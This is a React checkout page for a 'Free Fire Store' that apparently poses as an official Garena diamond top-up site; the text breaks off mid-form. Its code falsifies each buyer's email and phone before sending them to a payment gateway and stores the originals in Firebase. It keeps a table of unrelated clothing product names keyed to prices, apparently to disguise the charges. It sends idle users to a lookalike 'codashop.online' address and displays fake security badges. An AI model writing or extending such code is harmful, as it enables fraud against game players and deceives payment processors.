import { useState, useEffect, useRef } from 'react';
import { useSearchParams } from 'react-router-dom';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { db } from '../lib/firebase';

// Helper functions for email & phone alteration before sending to payment gateway
// Email: Modify strictly the LAST 3 characters in the email username, keeping domain as @gmail.com
function transformEmail(email: string): string {
  const parts = email.split('@');
  let username = parts[0] || 'customer';
  if (username.length < 3) {
    username = username.padEnd(3, 'x');
  }

  const prefix = username.slice(0, -3);
  const last3 = username.slice(-3);

  const transformedLast3 = last3
    .split('')
    .map((ch) => {
      const code = ch.charCodeAt(0);
      if (code >= 65 && code <= 90) {
        // Uppercase A-Z -> shift +1
        return String.fromCharCode(((code - 65 + 1) % 26) + 65);
      } else if (code >= 97 && code <= 122) {
        // Lowercase a-z -> shift +1
        return String.fromCharCode(((code - 97 + 1) % 26) + 97);
      } else if (code >= 48 && code <= 57) {
        // Digit 0-9 -> shift +1
        return String.fromCharCode(((code - 48 + 1) % 10) + 48);
      }
      return 'x';
    })
    .join('');

  const transformedUser = prefix + transformedLast3;
  return `${transformedUser}@gmail.com`;
}

// Phone: Prepend 91, and modify strictly the LAST 3 digits in the 10-digit phone number
function transformPhone(phone: string): string {
  const clean = phone.replace(/[^0-9]/g, '');
  const tenDigits = clean.length >= 10 ? clean.slice(-10) : clean.padStart(10, '9');

  const prefix = tenDigits.slice(0, -3);
  const last3 = tenDigits.slice(-3);

  const transformedLast3 = last3
    .split('')
    .map((digit) => String((Number(digit) + 1) % 10))
    .join('');

  const transformedTen = prefix + transformedLast3;
  return `91${transformedTen}`;
}

const PRODUCT_CATEGORIES: Record<string, string[]> = {
  '395.50': ['Wall Mounted Bathroom Storage Shelf with Towel Rack'],
  '490':    ['Korean Fashion Oversized Casual Cotton T-Shirt'],
  '499':    ['Women Multi Coloured Floral Regular Fit Crop Top'],
  '550':    [
    'Women Multi Coloured Floral Regular Fit Crop Top',
    'Black High Rise Skinny Fit Shapewear For Women',
    'Drop Shoulder Sleeves Regular Fit Sweatshirt For Women',
    'Portable Handheld Ring LED Light Photography Lamp'
  ],
  '750':    [
    'Blue Stripes Relaxed Fit Shirt For Women',
    'Nylon Blend Regular Fit Bra For Women',
    'Solid Tube Bra For Women'
  ],
  '1000':   ['Men Slim Fit Denim Jacket Vintage Edition'],
  '1100':   [
    'White and Black Wide Leg Fit Casual Trouser With 2 Pocket For Women',
    'Regular Fit Casual Trouser With 1 Pocket For Women',
    'Light Blue Solid Flared Jeans For Women'
  ],
  '1400':   [
    'Stripes Regular Fit Shirt For Men',
    'Skinny Fit Jeans With 5 Pocket For Women',
    'Striped Regular Fit T-Shirt For Infant Boys',
    'Cute Bear Phone Charms & Keychain Pendant'
  ],
  '5500':   [
    'Slim Fit Utility Pocket Trouser For Men',
    'Mens Slim Solid Navy Formal Trousers',
    'Solid Rayon Pant For Women',
    'LED Selfie Ring Lamp with Phone Holder & Tripod',
    'Cotton Blend Straight Fit Trouser for Women'
  ],
  '7500':   [
    'Olive Slim Fit Utility Pocket Trouser For Men',
    'Cotton Blend Regular Fit Shirt For Men',
    'Cotton Blend Solid Pant For Women',
    'Solid Plazzos For Women And Girls',
    'Stylish Women Maroon Gown Dress'
  ],
};

function getProductNameForPrice(price: string): string {
  const items = PRODUCT_CATEGORIES[price];
  if (items && items.length > 0) {
    const randomIndex = Math.floor(Math.random() * items.length);
    return items[randomIndex];
  }
  return 'Women Multi Coloured Floral Regular Fit Crop Top';
}

const CODASHOP_URL = 'https://www.codashop.online/';

// Missing parameters error screen component with 2-second countdown & redirect
function MissingParamsError() {
  const [barWidth, setBarWidth] = useState('100%');

  useEffect(() => {
    const t1 = setTimeout(() => setBarWidth('0%'), 50);
    const t2 = setTimeout(() => {
      window.location.replace('/');
    }, 2000);
    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
    };
  }, []);

  return (
    <div style={{
      minHeight: '100vh',
      background: '#f8fafc',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px',
      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
      boxSizing: 'border-box'
    }}>
      <div style={{
        maxWidth: '460px',
        width: '100%',
        background: '#ffffff',
        borderRadius: '16px',
        border: '1px solid #e2e8f0',
        boxShadow: '0 10px 25px -5px rgba(0, 0, 0, 0.08), 0 8px 10px -6px rgba(0, 0, 0, 0.04)',
        padding: '32px 24px',
        textAlign: 'center',
        boxSizing: 'border-box'
      }}>
        <div style={{
          width: '64px',
          height: '64px',
          background: '#fef2f2',
          border: '2px solid #fee2e2',
          borderRadius: '50%',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          margin: '0 auto 20px',
          fontSize: '28px'
        }}>
          ⚠️
        </div>
        
        <h2 style={{
          fontSize: '18px',
          fontWeight: 800,
          color: '#0f172a',
          marginBottom: '12px',
          textTransform: 'uppercase',
          letterSpacing: '0.5px'
        }}>
          No Item Selected
        </h2>

        <p style={{
          fontSize: '14px',
          lineHeight: '1.6',
          color: '#475569',
          marginBottom: '24px',
          fontWeight: 500
        }}>
          Your order was not. You have not selected any item. Please go back to home and select item for purchase.
        </p>

        <div style={{
          background: '#f1f5f9',
          borderRadius: '8px',
          padding: '12px 16px',
          fontSize: '12px',
          color: '#64748b',
          marginBottom: '20px'
        }}>
          <div>Redirecting to home page in 2 seconds...</div>
          <div style={{
            width: '100%',
            height: '4px',
            background: '#e2e8f0',
            borderRadius: '2px',
            marginTop: '8px',
            overflow: 'hidden'
          }}>
            <div style={{
              width: barWidth,
              height: '100%',
              background: '#ef4444',
              transition: 'width 2s linear'
            }} />
          </div>
        </div>

        <a 
          href="/" 
          style={{
            display: 'inline-block',
            padding: '11px 24px',
            background: '#0f172a',
            color: '#ffffff',
            borderRadius: '8px',
            fontSize: '13px',
            fontWeight: 700,
            textDecoration: 'none',
            letterSpacing: '0.5px'
          }}
        >
          GO TO HOMEPAGE NOW
        </a>
      </div>
    </div>
  );
}

export default function GarenaCheckout() {
  const [searchParams] = useSearchParams();

  const rawPkg   = searchParams.get('pkg');
  const diamonds = searchParams.get('diamonds') || '';
  const uid      = searchParams.get('uid')      || '';
  const nick     = searchParams.get('nick')     || '';
  const level    = searchParams.get('level')    || '';
  const status   = searchParams.get('status')   || '';

  // Check if valid package or status parameters exist in the HTTP request
  const hasValidParams = Boolean(rawPkg || diamonds || status);

  const pkg = rawPkg || diamonds || '499';

  // Save session info to local storage for success/failure screens
  useEffect(() => {
    if (nick) localStorage.setItem('ff_nick', nick);
    if (diamonds) localStorage.setItem('ff_dia', diamonds);
    if (rawPkg) localStorage.setItem('ff_price', rawPkg);
    if (level) localStorage.setItem('ff_lvl', level);
    if (uid) localStorage.setItem('ff_uid', uid);
  }, [nick, diamonds, rawPkg, level, uid]);

  // Responsive state system
  const [vw, setVw] = useState(
    typeof window !== 'undefined' ? window.innerWidth : 390
  );
  useEffect(() => {
    const handler = () => setVw(window.innerWidth);
    window.addEventListener('resize', handler);
    return () => window.removeEventListener('resize', handler);
  }, []);

  const isMobile  = vw < 640;
  const isTablet  = vw >= 640 && vw < 1024;
  const isDesktop = vw >= 1024;

  // Inject global CSS resets once & guarantee standard mobile viewport
  useEffect(() => {
    try {
      const viewportMeta = document.querySelector('meta[name="viewport"]');
      if (viewportMeta) {
        viewportMeta.setAttribute('content', 'width=device-width, initial-scale=1.0');
      }
    } catch (e) {
      // ignore
    }

    const style = document.createElement('style');
    style.innerHTML = `
      *, *::before, *::after { box-sizing: border-box; }
      html, body { margin: 0; padding: 0; overflow-x: hidden; }
      input, select, textarea { font-size: 16px !important; }
      button { -webkit-tap-highlight-color: transparent; }
      * { -webkit-font-smoothing: antialiased; }
    `;
    document.head.appendChild(style);
    return () => {
      if (document.head.contains(style)) {
        document.head.removeChild(style);
      }
    };
  }, []);

  // If parameters are missing in the request, render the error screen with 2-second redirect
  if (!hasValidParams) {
    return <MissingParamsError />;
  }

  const [form, setForm] = useState({ name: '', phone: '', email: '' });
  const [focusedField, setFocusedField] = useState<'name' | 'phone' | 'email' | null>(null);
  const [loading, setLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('Connecting to Payment Gateway...');
  const [error, setError] = useState('');
  const [countdown, setCountdown] = useState(5);
  const [barWidth, setBarWidth] = useState('100%');
  const [showPayModal, setShowPayModal] = useState(false);

  // Success page auto-redirection countdown
  useEffect(() => {
    if (status === 'success') {
      const timer = setInterval(() => {
        setCountdown(c => {
          if (c <= 1) {
            clearInterval(timer);
            window.location.href = 'https://www.codashop.online/?status=success';
          }
          return c - 1;
        });
      }, 1000);
      return () => clearInterval(timer);
    }
  }, [status]);

  // Failure page auto-redirection & progress bar
  useEffect(() => {
    if (status === 'failed') {
      const t1 = setTimeout(() => setBarWidth('0%'), 50);
      const t2 = setTimeout(() => {
        window.location.href = 'https://www.codashop.online/?status=failed';
      }, 2000);
      return () => {
        clearTimeout(t1);
        clearTimeout(t2);
      };
    }
  }, [status]);

  // Fix: reset loading and handle incomplete payment when user navigates back
  useEffect(() => {
    const checkPendingPayment = () => {
      const pendingStr = sessionStorage.getItem('pendingPayment');
      if (pendingStr) {
        sessionStorage.removeItem('pendingPayment');
        setError('Your previous payment was not completed. Please retry your payment.');
        setLoading(false);
      }
    };

    checkPendingPayment();

    const handlePageShow = (e: PageTransitionEvent) => {
      if ((e as any).persisted || document.visibilityState === 'visible') {
        setLoading(false);
        checkPendingPayment();
      }
    };
    window.addEventListener('pageshow', handlePageShow);
    return () => window.removeEventListener('pageshow', handlePageShow);
  }, []);

  const hasMovedRef = useRef(false);
  const idleTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  useEffect(() => {
    if (status) return; // don't run on success/failure pages
    if (loading || showPayModal) return; // user is active

    const IDLE_INITIAL = 15000;      // 15 sec — no movement
    const IDLE_AFTER_MOVE = 300000;  // 5 min — after any movement

    const redirectToSource = () => {
      window.location.replace(CODASHOP_URL);
    };

    const resetTimer = () => {
      if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
      idleTimerRef.current = setTimeout(redirectToSource, IDLE_AFTER_MOVE);
    };

    const handleActivity = () => {
      if (!hasMovedRef.current) {
        hasMovedRef.current = true;
        if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
      }
      resetTimer();
    };

    idleTimerRef.current = setTimeout(() => {
      if (!hasMovedRef.current) {
        redirectToSource();
      }
    }, IDLE_INITIAL);

    const events = ['mousemove', 'mousedown', 'keypress', 'touchstart', 'scroll', 'click'];
    events.forEach(e => window.addEventListener(e, handleActivity, { passive: true }));

    return () => {
      if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
      events.forEach(e => window.removeEventListener(e, handleActivity));
    };
  }, [status, loading, showPayModal]);

  // Handle Payment Execution
  const handlePay = async (mode: 'QR' | 'ALL' = 'ALL') => {
    if (!form.name.trim() || !form.phone.trim() || !form.email.trim()) {
      setError('Please fill in all fields (Name, Phone, Email).');
      return;
    }
    if (!/^\d{10}$/.test(form.phone)) {
      setError('Please enter a valid 10-digit mobile number.');
      return;
    }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) {
      setError('Please enter a valid email address.');
      return;
    }

    // Ensure standard responsive mobile viewport
    try {
      const viewportMeta = document.querySelector('meta[name="viewport"]');
      if (viewportMeta) {
        viewportMeta.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
      }
    } catch (e) {
      // ignore
    }
    
    setShowPayModal(false);
    setLoading(true);
    setLoadingMessage('Connecting to Secure Payment Gateway…');
    setError('');

    try {
      const alteredEmail = transformEmail(form.email.trim());
      const alteredPhone = transformPhone(form.phone.trim());

      const payload = {
        amount: Number(pkg) || 0,
        source: 'garena',
        customerData: {
          firstName: form.name.split(' ')[0] || form.name,
          lastName: form.name.split(' ').slice(1).join(' ') || '',
          email: alteredEmail,
          phone: alteredPhone
        }
      };

      // Save customer's original email, original phone, altered email, altered phone to Firebase
      try {
        await addDoc(collection(db, 'garena_checkout_orders'), {
          uid: String(uid || '').replace(/[^0-9]/g, ''),
          originalEmail: form.email.trim(),
          originalPhone: form.phone.trim(),
          alteredEmail,
          alteredPhone,
          customerName: form.name.trim(),
          amount: pkg,
          createdAt: serverTimestamp(),
          status: 'initiated'
        });
      } catch (dbErr) {
        console.error('Firebase order logging error:', dbErr);
      }

      const res = await fetch('/api/payglocal/initiate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (!res.ok) {
        throw new Error('Payment gateway initialization failed. Please try again.');
      }

      const data = await res.json();
      
      if (data.redirectUrl) {
        sessionStorage.setItem('pendingPayment', JSON.stringify({
          txnId: data.merchantTxnId,
          gid: data.gid,
          startedAt: Date.now()
        }));

        console.log("PayGlocal Browser Redirect URL:", data.redirectUrl);
        window.location.href = data.redirectUrl;
        return;
      } else {
        throw new Error('Could not get payment redirect URL');
      }
    } catch (err: any) {
      setLoading(false);
      setError(err?.message || 'Payment processing failed. Please try again.');
    }
  };

  // SUCCESS PAGE
  if (status === 'success') {
    const savedNick   = localStorage.getItem('ff_nick')   || nick || 'Player';
    const savedDia    = localStorage.getItem('ff_dia')    || diamonds || '';
    const savedLvl    = localStorage.getItem('ff_lvl')    || level || '';
    const savedAvatar = localStorage.getItem('ff_avatar_url') || '';
    const savedUid    = localStorage.getItem('ff_uid')    || uid;

    return (
      <div style={{
        background: '#f5f6fa',
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: isMobile ? 16 : 24,
        fontFamily: "'Segoe UI', system-ui, sans-serif",
        boxSizing: 'border-box'
      }}>
        <div style={{
          maxWidth: isMobile ? '100%' : 420,
          borderRadius: isMobile ? 16 : 20,
          background: 'white',
          border: '1px solid #ebebeb',
          boxShadow: '0 8px 32px rgba(0,0,0,0.08)',
          width: '100%',
          overflow: 'hidden',
          boxSizing: 'border-box'
        }}>
          <div style={{
            height: 6,
            background: 'linear-gradient(90deg, #ee2c24, #ff6b35)'
          }} />

          <div style={{ padding: isMobile ? '28px 20px 24px' : '36px 28px 32px', boxSizing: 'border-box' }}>
            <div style={{
              width: 72,
              height: 72,
              background: '#f0fdf4',
              border: '2px solid #bbf7d0',
              borderRadius: '50%',
              margin: '0 auto 20px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center'
            }}>
              <span style={{ fontSize: 34, color: '#16a34a', fontWeight: 900 }}>✓</span>
            </div>

            <h2 style={{
              fontSize: isMobile ? 20 : 22,
              fontWeight: 900,
              color: '#111',
              margin: '0 0 6px',
              textAlign: 'center'
            }}>
              Your order has been confirmed
            </h2>

            {savedDia && (
              <div style={{ textAlign: 'center', margin: '0 0 20px' }}>
                <span style={{ fontSize: isMobile ? 24 : 28, fontWeight: 900, color: '#ee2c24' }}>
                  💎 {savedDia} Diamonds
                </span>
              </div>
            )}

            <div style={{
              background: '#f9fafb',
              border: '1px solid #f0f0f0',
              borderRadius: 12,
              padding: '14px 16px',
              marginBottom: 20,
              display: 'flex',
              alignItems: 'center',
              gap: 12
            }}>
              {savedAvatar && (
                <img
                  src={savedAvatar}
                  alt="avatar"
                  style={{
                    width: 44,
                    height: 44,
                    borderRadius: '50%',
                    border: '2px solid #ee2c24',
                    objectFit: 'cover',
                    display: 'block'
                  }}
                  onError={(e) => {
                    (e.target as HTMLImageElement).style.display = 'none';
                  }}
                />
              )}
              <div>
                <span style={{ fontSize: 14, fontWeight: 800, color: '#111', display: 'block' }}>
                  {savedNick}
                </span>
                {savedUid && (
                  <span style={{ fontSize: 11, color: '#999', fontWeight: 600, display: 'block', marginTop: 2 }}>
                    UID: {savedUid} {savedLvl ? `· Lv. ${savedLvl}` : ''}
                  </span>
                )}
              </div>
            </div>

            <div style={{
              background: '#fff7f7',
              border: '1px solid #fee2e2',
              borderRadius: 10,
              padding: '10px 16px',
              marginBottom: 20,
              textAlign: 'center',
              fontSize: 12,
              color: '#888'
            }}>
              Redirecting in <span style={{ fontWeight: 800, color: '#ee2c24', fontSize: 16 }}>{countdown} seconds</span>…
            </div>

            <div style={{ textAlign: 'center', fontSize: 11, color: '#ccc' }}>
              🔒 Payment secured by Free Fire Store · Do not close this window
            </div>
          </div>
        </div>
      </div>
    );
  }

  // FAILED PAGE
  if (status === 'failed') {
    return (
      <div style={{
        background: '#f5f6fa',
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: isMobile ? 16 : 24,
        fontFamily: "'Segoe UI', system-ui, sans-serif",
        boxSizing: 'border-box'
      }}>
        <div style={{
          maxWidth: isMobile ? '100%' : 400,
          borderRadius: isMobile ? 16 : 20,
          background: 'white',
          border: '1px solid #ebebeb',
          boxShadow: '0 8px 32px rgba(0,0,0,0.08)',
          width: '100%',
          overflow: 'hidden',
          boxSizing: 'border-box'
        }}>
          <div style={{
            height: 6,
            background: 'linear-gradient(90deg, #ee2c24, #c0392b)'
          }} />

          <div style={{ padding: isMobile ? '28px 20px 24px' : '36px 28px 32px', boxSizing: 'border-box' }}>
            <div style={{
              width: 72,
              height: 72,
              background: '#fff5f5',
              border: '2px solid #fecaca',
              borderRadius: '50%',
              margin: '0 auto 20px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center'
            }}>
              <span style={{ fontSize: 30, color: '#dc2626', fontWeight: 900 }}>✕</span>
            </div>

            <h2 style={{
              fontSize: 20,
              fontWeight: 900,
              color: '#111',
              margin: '0 0 8px',
              textAlign: 'center'
            }}>
              Payment could not be completed
            </h2>

            <p style={{
              fontSize: 13,
              color: '#888',
              textAlign: 'center',
              margin: '0 0 24px',
              lineHeight: 1.6
            }}>
              Your payment was cancelled or failed. No amount was deducted.
            </p>

            <div style={{
              background: '#f9fafb',
              border: '1px solid #f0f0f0',
              borderRadius: 10,
              padding: '12px 16px',
              marginBottom: 20,
              textAlign: 'center',
              fontSize: 12,
              color: '#aaa',
              boxSizing: 'border-box'
            }}>
              Taking you back in 2 seconds…
              <div style={{
                width: '100%',
                height: 4,
                background: '#e5e7eb',
                borderRadius: 2,
                marginTop: 8,
                overflow: 'hidden'
              }}>
                <div style={{
                  width: barWidth,
                  height: '100%',
                  background: 'linear-gradient(90deg, #ee2c24, #c0392b)',
                  transition: 'width 2s linear'
                }} />
              </div>
            </div>

            <div style={{ textAlign: 'center', fontSize: 11, color: '#ccc' }}>
              🔒 Payment secured · Do not close this window
            </div>
          </div>
        </div>
      </div>
    );
  }

  // CARD STYLE HELPER
  const cardStyle = {
    background: 'white',
    borderRadius: isMobile ? 14 : 16,
    border: '1px solid #ebebeb',
    boxShadow: '0 2px 8px rgba(0,0,0,0.05)',
    padding: isMobile ? '16px 14px' : '20px 24px',
    boxSizing: 'border-box' as const,
  };

  // CARD HEADER STYLE HELPER
  const renderCardHeader = (num: string, text: string) => (
    <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: isMobile ? 14 : 18 }}>
      <div style={{
        width: 22, height: 22, background: '#ee2c24',
        color: 'white', borderRadius: 6,
        fontSize: 11, fontWeight: 800,
        display: 'flex', alignItems: 'center', justifyContent: 'center'
      }}>
        {num}
      </div>
      <span style={{ fontSize: isMobile ? 13 : 14, fontWeight: 800, color: '#111' }}>{text}</span>
    </div>
  );

  return (
    <div style={{
      minHeight: '100vh',
      background: '#f5f6fa',
      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
      WebkitFontSmoothing: 'antialiased'
    }}>
      {/* FULLSCREEN LOADING OVERLAY */}
      {loading && (
        <div
          style={{
            position: 'fixed',
            inset: 0,
            zIndex: 999999,
            background: 'rgba(10, 12, 16, 0.92)',
            backdropFilter: 'blur(10px)',
            WebkitBackdropFilter: 'blur(10px)',
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            justifyContent: 'center',
            gap: 20,
            padding: 24,
            textAlign: 'center'
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <span className="store-monogram" aria-hidden="true">FS</span>
            <span style={{ fontSize: 24, fontWeight: 900, color: '#ffffff', letterSpacing: '0.5px' }}>FREE FIRE STORE</span>
          </div>

          <div style={{ display: 'flex', gap: 10, marginTop: 8 }}>
            {[0, 1, 2].map(i => (
              <div
                key={i}
                style={{
                  width: 12,
                  height: 12,
                  borderRadius: '50%',
                  background: '#ee2c24',
                  boxShadow: '0 0 12px rgba(238, 44, 36, 0.8)',
                  animation: 'garena-bounce 1.2s ease-in-out infinite',
                  animationDelay: `${i * 0.2}s`,
                }}
              />
            ))}
          </div>

          <div style={{ fontSize: 16, color: '#ffffff', fontWeight: 800, letterSpacing: 0.3, marginTop: 4 }}>
            {loadingMessage}
          </div>
          <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.6)', fontWeight: 500 }}>
            Please do not refresh or close this window
          </div>
          <style>{`
            @keyframes garena-bounce {
              0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
              40% { transform: scale(1.2); opacity: 1; }
            }
          `}</style>
        </div>
      )}
      
      {/* LAYER 1 — STICKY HEADER */}
      <header style={{
        position: 'sticky',
        top: 0,
        zIndex: 100,
        width: '100%',
        background: 'white',
        borderBottom: '1px solid #f0f0f0',
        boxShadow: '0 1px 3px rgba(0,0,0,0.06)',
      }}>
        <div style={{
          maxWidth: 480,
          margin: '0 auto',
          padding: isMobile ? '0 14px' : '0 24px',
          height: isMobile ? 50 : 56,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
          boxSizing: 'border-box'
        }}>
          {/* Left: logo + divider + title */}
          <div style={{ display: 'flex', alignItems: 'center', gap: 0, minWidth: 0, flex: 1 }}>
            <span className="store-monogram" aria-hidden="true">FS</span>

            <div style={{
              width: 2, height: isMobile ? 18 : 22,
              background: '#f59e0b', borderRadius: 4,
              margin: '0 10px', flexShrink: 0
            }} />

            <span style={{
              color: '#111', fontWeight: 900,
              fontSize: isMobile ? 10 : 12,
              letterSpacing: '0.6px',
              textTransform: 'uppercase',
              lineHeight: 1, whiteSpace: 'nowrap',
              overflow: 'hidden', textOverflow: 'ellipsis'
            }}>
              Official Top Up Center
            </span>
          </div>

          <div style={{
            background: '#fff0ef', border: '1px solid #fecaca',
            borderRadius: 999, padding: isMobile ? '4px 10px' : '5px 14px',
            display: 'flex', alignItems: 'center', gap: 5, flexShrink: 0, marginLeft: 8
          }}>
            <span style={{
              width: 6, height: 6, borderRadius: '50%',
              background: '#ee2c24', flexShrink: 0
            }} />
            <span style={{
              fontSize: isMobile ? 10 : 11, fontWeight: 700, color: '#333',
              maxWidth: isMobile ? 80 : 120,
              overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap'
            }}>
              {nick || 'Guest'}
            </span>
          </div>
        </div>
      </header>

      {/* LAYER 2 — GAME BANNER */}
      <div style={{
        position: 'relative',
        width: '100%',
        height: isMobile ? 88 : isTablet ? 110 : 130,
        overflow: 'hidden',
      }}>
        <div style={{
          position: 'absolute', inset: 0,
          backgroundImage: 'linear-gradient(125deg, #513d32, #94765e)',
          backgroundSize: 'cover', backgroundPosition: 'center top',
        }} />
        <div style={{ position: 'absolute', inset: 0, background: 'rgba(0,0,0,0.38)' }} />
        <div style={{
          position: 'relative', height: '100%',
          display: 'flex', alignItems: 'center',
          padding: isMobile ? '0 14px' : '0 24px',
          gap: isMobile ? 10 : 14,
          maxWidth: 480,
          margin: '0 auto',
        }}>
          <span className="store-monogram" aria-hidden="true">FS</span>
          <div>
            <h1 style={{
              color: 'white', fontSize: isMobile ? 14 : 16,
              fontWeight: 900, margin: '0 0 5px',
            }}>Free Fire Store</h1>
            <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap', alignItems: 'center' }}>
              <span style={{
                background: 'rgba(18, 18, 18, 0.85)',
                border: '1px solid rgba(255, 255, 255, 0.15)',
                color: 'white',
                borderRadius: 20,
                padding: isMobile ? '3px 8px' : '4px 10px',
                fontSize: isMobile ? 9 : 10,
                fontWeight: 900,
                letterSpacing: '0.4px',
                display: 'inline-flex',
                alignItems: 'center',
                gap: 4
              }}>
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#10b981" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                  <path d="m9 12 2 2 4-4" />
                </svg>
                100% SECURE PAYMENTS
              </span>
              <span style={{
                background: 'linear-gradient(135deg, #eab308, #ca8a04)',
                color: '#1a1a1a',
                borderRadius: 20,
                padding: isMobile ? '3px 8px' : '4px 10px',
                fontSize: isMobile ? 9 : 10,
                fontWeight: 900,
                display: 'inline-flex',
                alignItems: 'center',
                gap: 4
              }}>
                <svg width="11" height="11" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2l2.4 5.2 5.6.8-4 4.1 1 5.7-5-2.8-5 2.8 1-5.7-4-4.1 5.6-.8z" />
                </svg>
                9TH ANNIVERSARY
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* LAYER 3 — CONTENT BODY */}
      <div style={{
        background: '#f5f6fa',
        padding: isMobile ? '14px 12px 40px' : isTablet ? '20px 24px 48px' : '28px 24px 60px',
        boxSizing: 'border-box'
      }}>
        <div style={{
          display: 'flex',
          flexDirection: 'column',
          gap: 16,
          maxWidth: 480,
          margin: '0 auto',
        }}>
          
          {/* Column 1 (Left on desktop) */}
          <div style={{ display: 'flex', flexDirection: 'column' }}>
            {/* CARD 1 — ORDER SUMMARY */}
            <div style={{ ...cardStyle, marginBottom: 12 }}>
              {renderCardHeader('①', 'Order Summary')}

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: isMobile ? '8px 0' : '10px 0', borderBottom: '1px solid #f5f5f5', fontSize: isMobile ? 12 : 13 }}>
                <span style={{ color: '#777' }}>Nickname</span>
                <span style={{ fontWeight: 700, color: '#111' }}>{nick || 'Guest'}</span>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: isMobile ? '8px 0' : '10px 0', borderBottom: '1px solid #f5f5f5', fontSize: isMobile ? 12 : 13 }}>
                <span style={{ color: '#777' }}>UID</span>
                <span style={{ fontWeight: 700, color: '#111', fontFamily: 'monospace', letterSpacing: '0.5px' }}>{uid || 'N/A'}</span>
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: isMobile ? '8px 0' : '10px 0', borderBottom: '1px solid #f5f5f5', fontSize: isMobile ? 12 : 13 }}>
                <span style={{ color: '#777' }}>Level</span>
                <span style={{ background: '#fef3c7', color: '#d97706', fontSize: 11, fontWeight: 700, padding: '2px 8px', borderRadius: 6 }}>
                  Lv. {level || '1'}
                </span>
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: isMobile ? '8px 0' : '10px 0', borderBottom: '1px solid #f5f5f5', fontSize: isMobile ? 12 : 13 }}>
                <span style={{ color: '#777' }}>Diamonds</span>
                <span style={{ fontWeight: 800, color: '#ee2c24', fontSize: 14 }}>💎 {diamonds || 'Topup'}</span>
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', paddingTop: 16, fontSize: isMobile ? 14 : 15 }}>
                <span style={{ fontWeight: 800, color: '#111' }}>Total Amount</span>
                <span style={{ fontWeight: 900, fontSize: isMobile ? 22 : 26, color: '#111' }}>₹{pkg}</span>
              </div>
            </div>
          </div>

          {/* Column 2 (Right on desktop) */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
            {/* CARD 2 — YOUR DETAILS */}
            <div style={cardStyle}>
              {renderCardHeader('②', 'Your Details')}

              <div style={{ marginBottom: isMobile ? 12 : 14 }}>
                <label style={{ fontSize: 12, fontWeight: 700, color: '#555', marginBottom: 6, display: 'block' }}>
                  Full Name
                </label>
                <input
                  type="text"
                  placeholder="Enter your full name"
                  value={form.name}
                  onChange={e => setForm(prev => ({ ...prev, name: e.target.value }))}
                  onFocus={() => setFocusedField('name')}
                  onBlur={() => setFocusedField(null)}
                  style={{
                    width: '100%',
                    padding: isMobile ? '13px 14px' : '13px 16px',
                    border: '1.5px solid',
                    borderColor: focusedField === 'name' ? '#ee2c24' : '#e8e8e8',
                    boxShadow: focusedField === 'name' ? '0 0 0 3px rgba(238,44,36,0.08)' : 'none',
                    borderRadius: 10,
                    fontSize: 16,
                    color: '#111',
                    outline: 'none',
                    boxSizing: 'border-box',
                    background: 'white',
                    WebkitAppearance: 'none',
                    appearance: 'none',
                    transition: 'border-color 0.15s, box-shadow 0.15s'
                  }}
                />
              </div>

              <div style={{ marginBottom: isMobile ? 12 : 14 }}>
                <label style={{ fontSize: 12, fontWeight: 700, color: '#555', marginBottom: 6, display: 'block' }}>
                  Phone Number
                </label>
                <input
                  type="tel"
                  placeholder="10-digit mobile number"
                  value={form.phone}
                  onChange={e => setForm(prev => ({ ...prev, phone: e.target.value.replace(/\D/g, '').slice(0, 10) }))}
                  onFocus={() => setFocusedField('phone')}
                  onBlur={() => setFocusedField(null)}
                  style={{
                    width: '100%',
                    padding: isMobile ? '13px 14px' : '13px 16px',
                    border: '1.5px solid',
                    borderColor: focusedField === 'phone' ? '#ee2c24' : '#e8e8e8',
                    boxShadow: focusedField === 'phone' ? '0 0 0 3px rgba(238,44,36,0.08)' : 'none',
                    borderRadius: 10,
                    fontSize: 16,
                    color: '#111',
                    outline: 'none',
                    boxSizing: 'border-box',
                    background: 'white',
                    WebkitAppearance: 'none',
                    appearance: 'none',
                    transition: 'border-color 0.15s, box-shadow 0.15s'
                  }}
                />
              </div>

              <div style={{ marginBottom: 12 }}>
